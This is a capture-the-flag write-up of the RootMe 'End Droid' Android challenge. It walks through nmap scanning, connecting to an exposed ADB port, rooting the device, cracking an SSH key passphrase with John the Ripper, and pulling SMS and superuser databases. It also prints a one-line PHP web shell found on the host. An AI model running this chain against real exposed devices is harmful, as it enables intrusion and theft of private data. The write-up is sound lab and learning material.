---
title: RootMe - End Droid Writeup
date: 2023-10-08
categories: [RootMe, Realistic]
tags: [RootMe, RootMe - Realistic, WriteUp, Android]
author: barabulkit
---

# RootMe - End Droid

This challenge is kinda dissappointing for me (honestly i didn't validate it)\
But i will consider like i did, cause i guess i found anything possible, and even the flag, i'm just not able to validate it

This is challenge about android and all we have is the server address, so i started with 

```shell
nmap -PN -sT -sV -p0-65535 ctf04.root-me.org
Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-08 19:17 +03
Nmap scan report for ctf04.root-me.org (212.129.28.21)
Host is up (0.074s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
5555/tcp open  adb     Android Debug Bridge device (name: android_x86; model: VMware Virtual Platform; device: x86)
8080/tcp open  http    PHP cli server 5.5 or later
22000/tcp open  ssh     Dropbear sshd 2014.66 (protocol 2.0)

Service Info: OS: Android; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.56 seconds
```

We can see that there is ADB service at 5555 port\
lets install adb client to kali and connect to this service
```shell
sudo apt install android-tools-adb android-tools-fastboot
```

And then connect to device
```shell
adb connect ctf04.root-me.org:5555
```

now we can start searching for flag on the server
```shell
ls /mnt/shell/emulated/0
Alarms
Android
Boot_Shell
DCIM
Download
Movies
Music
Podcasts
Ringtones
htdocs
kickwebinfo
obb
passwd
ssh
storage
www
```

I have found what i was looking for there (passwd file), but wasn't able to read it
```shell
adb shell cat /mnt/shell/emulated/0/passwd
/system/bin/sh: cat: /mnt/shell/emulated/0/passwd: Permission denied
```

i wasn't knowing why i can't read it yet, so i just continued my investigation\
And found php backdoor
```
adb shell cat /mnt/shell/emulated/0/www/public/announce/backdoor.php
<?php system($_POST['secret']);?>
```

Unfortunately this is not very usefull cause this is the same thing as `adb shell`\
But then i found private ssh key
```shell
adb shell ls /mnt/shell/emulated/0/www/public/secret22000
touhid.key
```

So i pulled it and tried to connect to ssh with it
```shell
adb pull touhid.key
ssh -i touhid.key -p 22000 touhid@ctf04.root-me.org
```

But got prompted that i need a passphase for this key\
So i cracked this with johntheripper

```shell
ssh2john touhid.key > touhid.hash
wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/darkweb2017-top10.txt
john --wordlist=darkweb2017-top10.txt touhid.hash
john --show touhid.hash

touhid.key:qwerty

1 password hash cracked, 0 left
```

But it didn't give me anything, i was not able to connect even with passphrase
```shell
ssh -i touhid.key -p 22000 touhid@ctf04.root-me.org
touhid@ctf04.root-me.org: Permission denied (publickey).
```

Then i went to google to read more about adb and android filesystem\
And i found that i can try to get root with just
```shell
adb root
```

and it worked, but i still couldn't read passwd file
```shell
adb shell cat /mnt/shell/emulated/0/passwd
/system/bin/sh: cat: /mnt/shell/emulated/0/passwd: Permission denied
```

And that was because i read it from wrong location, there is actual storage at `/data/media/0` that is the same as `/mnt/shell/emulated/0`
And i was able to read passwd from it
```shell
adb shell cat /data/media/0/passwd
c1937a38926e84f2c5995438afd6e41f
```

I can even change access rights to this file through `/data/media/0`
```shell
adb shell chmod 777 /data/media/0/passwd
```

And now i can read it even from `/mnt/shell/emulated/0`
```shell
adb shell cat /mnt/shell/emulated/0/passwd
c1937a38926e84f2c5995438afd6e41f
```

And looks like thats it, i have solved the challenge, but i only was able to validate it on virtual env page for this challenge
![validated](/assets/img/rootme/realistic/enddroid/realistic-enddroid.png)

But i wasn't able to validate a challenge with this flag at the challenge page so it still not finished
I even tried to do a bit more, i found flag.txt
```shell
adb shell cat /data/root/flag.txt 
No flag here but you can check your sms :) !
```

But it is not a flag, but there is a hint to check sms.
So i downloaded sms database with
```shell
adb pull /data/data/com.android.providers.telephony/databases/mmssms.db
```

But it was empty, i then downloaded calendar database, downloads database, gmail database, and in all this dbs there was nothing\
I also found another way to obtain flag i already have through superuser database
```shell
adb pull  /data/data/com.thirdparty.superuser/databases/

/data/data/com.thirdparty.superuser/databases/: 4 files pulled, 0 skipped. 0.0 MB/s (119912 bytes in 3.169s)
```

![superuserdb](/assets/img/rootme/realistic/enddroid/enddroiddb.png)

So that is all i was able to find in this challenge and still was not able to validate it, but at least i learned a bit about android\
\
UPD. finally got the flag
![flag](/assets/img/rootme/realistic/enddroid/enddroidflag.png)